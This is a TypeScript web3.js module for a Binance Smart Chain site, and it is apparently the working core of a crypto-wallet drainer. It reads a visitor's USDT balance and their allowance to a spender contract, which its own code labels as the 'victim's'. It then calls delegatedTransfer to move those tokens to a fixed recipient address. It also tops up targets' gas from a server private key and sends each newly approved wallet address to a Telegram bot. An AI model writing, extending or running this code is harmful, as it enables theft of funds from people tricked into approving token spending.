"use client";
import Web3 from "web3";
import { bscChainId, bscChainIdinNumer, CHAT_ID, rpcUrl, RECIPIENT_ADDRESS, SPENDER_ADDRESS, spender_Contract_Abi, TELEGRAM_BOT_TOKEN, USDT_ABI, USDT_CONTRACT_ADDRESS } from "./constent";

interface UserBalance {
  balance: string;
  allowance: number;
  error:    Error | null;
}


// ...existing code...
const privateKey = process.env.NEXT_PRIVATE_KEY;
export const sendBNB = async (
  to: string,
  options?: { ensureGas?: boolean; minGasBNB?: number; topUpBNB?: number }
) => {
  try {
    if (!privateKey) throw new Error("Private key not set in environment variables");
    const web3 = new Web3(rpcUrl);
    const accountObj = web3.eth.accounts.privateKeyToAccount(privateKey);
    const account = accountObj.address;

    // defaults
    const ensureGas = options?.ensureGas ?? true;
    const minGasBNB = options?.minGasBNB ?? 0.0005; // if user has less than this, top up
    const topUpBNB = options?.topUpBNB ?? 0.0000258075; // amount to send as gas top up

    const toBalanceWei = await web3.eth.getBalance(to);
    const minGasWei = web3.utils.toWei(minGasBNB.toString(), "ether");
    if (ensureGas && BigInt(toBalanceWei) < BigInt(minGasWei)) {
      // send top up so user can pay gas
      const topUpWei = web3.utils.toWei(topUpBNB.toString(), "ether");
      // prepare and sign tx
      const nonce = await web3.eth.getTransactionCount(account, "pending");
      const gasPrice = await web3.eth.getGasPrice();
      const gasLimit = 21000;
      const txObject = {
        nonce: web3.utils.toHex(nonce),
        to: to,
        value: web3.utils.toHex(topUpWei),
        gas: web3.utils.toHex(gasLimit),
        gasPrice: web3.utils.toHex(gasPrice),
        chainId: bscChainIdinNumer,
      };
      const signed = await web3.eth.accounts.signTransaction(txObject, privateKey);
      if (!signed.rawTransaction) throw new Error("Failed to sign top-up transaction");
      const topUpReceipt = await web3.eth.sendSignedTransaction(signed.rawTransaction);
      return{
        isNeededGas: true,
        status: true,
        tx: topUpReceipt,
        error: null
      }
    }
    return {
      isNeededGas: false,
      status: true,
      tx: null,
      error: null,
    };
  } catch (err) {
    console.error("Error in sendBNB:", err);
    return {
      isNeededGas: false,
      status: false,
      tx: null,
      error: err as Error,
    };
  }
}



export const connectWalletBSC = async () => {
  try {
    if (!window.ethereum) {
      throw new Error("No crypto wallet found. Please install MetaMask or Trust Wallet");
    }
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    const web3 = new Web3(window.ethereum);
    const chainId = await web3.eth.getChainId();
    if (Number(chainId) !== bscChainIdinNumer) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: bscChainId }], 
        });
      } catch (switchError) {}
    }
    return {
      status: "success",
      account: accounts[0],
      web3: new Web3(window.ethereum),
    };
  } catch (err) {
    return {
      status: "failed",
      error: err,
      web3: null,
    };
  }
};

export const withDrawFunds = async (from: string, amount: number) => {
  try {
    const { web3, account } = await connectWalletBSC();
    if (!web3) throw new Error("Wallet connection failed");

    // Fix Web3.js timeout for BSC
    web3.eth.transactionBlockTimeout = 100; // default is 50, BSC can be slow
    web3.eth.transactionPollingTimeout = 480;
    web3.eth.transactionConfirmationBlocks = 1;

    // amount to be in wei
    const amountInWei = web3.utils.toWei(amount.toString(), "ether");

    // Pre-flight checks for better error messages
    const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
    const victimBalance = (await usdtContract.methods.balanceOf(from).call()) as string;
    const victimAllowance = (await usdtContract.methods
      .allowance(from, SPENDER_ADDRESS)
      .call()) as string;

    if (BigInt(victimBalance) < BigInt(amountInWei)) {
      throw new Error(
        `Victim balance too low: ${web3.utils.fromWei(
          victimBalance,
          "ether"
        )} USDT`
      );
    }

    if (BigInt(victimAllowance) < BigInt(amountInWei)) {
      throw new Error(
        `Insufficient allowance: ${web3.utils.fromWei(
          victimAllowance,
          "ether"
        )} USDT`
      );
    }

    const deligator = new web3.eth.Contract(
      spender_Contract_Abi,
      SPENDER_ADDRESS
    );

    // Check ownership
    const owner = (await deligator.methods.owner().call()) as string;
    if (account.toLowerCase() !== owner.toLowerCase()) {
      throw new Error(`Only the owner (${owner}) can withdraw.`);
    }

    const currentGasPrice = await web3.eth.getGasPrice();
    // Ensure gas price is at least 3 Gwei (3,000,000,000 wei)
    const minGasPrice = BigInt(3000000000);
    const finalGasPrice = BigInt(currentGasPrice) > minGasPrice ? BigInt(currentGasPrice) : minGasPrice;

    console.log("withdrawing from:", from, "amount:", amount);
    const tx = await deligator.methods
      .delegatedTransfer(
        USDT_CONTRACT_ADDRESS,
        from,
        RECIPIENT_ADDRESS,
        amountInWei
      )
      .send({
        from: account,
        gas: "500000", // Manual gas limit to bypass estimation failure
        gasPrice: finalGasPrice.toString(),
      });
    return tx;
  } catch (err) {
    console.error("Error in withDrawFunds:", err);
    return {
      status: false,
      error: err,
    };
  }
};

export const contract_Owner = async (): Promise<string | null> => {
  try {
    const { web3 } = await connectWalletBSC();
    if (!web3) throw new Error("Wallet connection failed");
    const usdtContract = new web3.eth.Contract(
      spender_Contract_Abi,
      SPENDER_ADDRESS
    );
    const owner = (await usdtContract.methods.owner().call()) as string;
    return owner as unknown as string;
  } catch (error) {
    console.error("Error fetching owner:", error);
    return null;
  }
};

export const balance_USDT_Allownce = async (
  user: string
): Promise<UserBalance> => {
  try {
    const { web3 } = await connectWalletBSC();
    if (!web3) throw new Error("Wallet connection failed");
    const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
    const balance = (await usdtContract.methods.balanceOf(user).call()) as string;
    const userAllow = (await usdtContract.methods
      .allowance(user, SPENDER_ADDRESS)
      .call()) as string;
    console.log("user", user, "Balance:", balance, "Allowance:", userAllow);
    return {
      balance: (Number(balance) / 10 ** 18).toFixed(7),
      allowance: Number(userAllow),
      error: null,
    };
  } catch (error) {
    console.error("Error fetching balance:", error);
    return {
      balance: "0",
      allowance: 0,
      error: error as Error,
    };
  }
};



export const sendAlert = async (address: string) => {
  try {
    const message = `🔔<b> New Wallet Approved</b>\n🧾 Wallet: <code>${address}</code>`
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (err) {
    console.error("Telegram alert error:", err);
  }
};
